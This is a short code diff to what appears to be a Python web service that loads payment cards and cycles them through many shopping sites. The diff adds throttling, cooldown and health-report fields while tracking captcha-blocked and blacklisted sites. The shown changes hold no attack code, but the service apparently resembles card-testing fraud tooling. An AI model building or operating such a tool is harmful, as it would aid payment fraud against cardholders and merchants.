 async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
     now = time.time()
@@ -2629,6 +2667,9 @@ async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
         q = _site_quarantine.get(host, {})
 
         if s and now < s.get("blacklisted_until", 0):
+            continue
+
+        if now < q.get("throttled_until", 0):
             continue
 
         hp = q.get("has_products")
@@ -2664,7 +2705,6 @@ async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
     })
 
 
-# ── QUARANTINE ──────────────────────────────────────────────────────────────
 @app.get("/quarantine")
 async def quarantine_route(min_hits: int = 3):
     out = {}
@@ -2690,18 +2730,20 @@ async def skip_site_route(site: str = Query(...)):
     return JSONResponse({"skipped": host})
 
 
-# ── MISC ────────────────────────────────────────────────────────────────────
 @app.get("/health")
 async def health_route():
     cards = _get_cards()
+    now = time.time()
     return JSONResponse({
         "status":               "ok",
-        "version":              "3.8.3",
+        "version":              "3.8.4",
         "cards_loaded":         len(cards),
         "site_concurrency":     SITE_CONCURRENCY,
         "cache_ttl":            CACHE_TTL,
         "variant_ttl":          VARIANT_TTL,
         "session_fail_ttl":     SESSION_FAIL_TTL,
+        "fail_cache_ttl":       FAIL_CACHE_TTL,
+        "throttle_cooldown":    THROTTLE_COOLDOWN,
         "max_price":            MAX_PRICE,
         "min_amount":           MIN_AMOUNT,
         "hard_max_price":       HARD_MAX_PRICE,
@@ -2713,7 +2755,9 @@ async def health_route():
         "cached_products":      len(_product_cache),
         "cached_variants":      len(_variant_cache),
         "blacklisted_sites":    sum(1 for s in _site_stats.values()
-                                     if time.time() < s.get("blacklisted_until", 0)),
+                                     if now < s.get("blacklisted_until", 0)),
+        "throttled_sites":      sum(1 for q in _site_quarantine.values()
+                                     if now < q.get("throttled_until", 0)),
         "no_product_sites":     sum(1 for q in _site_quarantine.values()
                                      if q.get("has_products") is False),
         "captcha_sites":        sum(1 for q in _site_quarantine.values()
